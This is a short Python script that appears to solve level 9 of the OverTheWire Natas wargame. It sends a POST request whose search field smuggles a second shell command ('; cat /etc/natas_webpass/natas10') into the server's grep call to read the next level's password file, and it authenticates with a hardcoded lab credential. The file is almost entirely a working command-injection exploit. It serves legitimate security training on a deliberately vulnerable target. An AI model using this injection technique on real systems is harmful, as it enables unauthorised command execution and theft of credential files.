#!/usr/bin/env python
import requests
payload={'needle':'win; cat /etc/natas_webpass/natas10','submit':'Search'}

url="http://natas9.natas.labs.overthewire.org"
r=requests.post(url, data=payload, auth=('natas9','W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl'))


print r.text
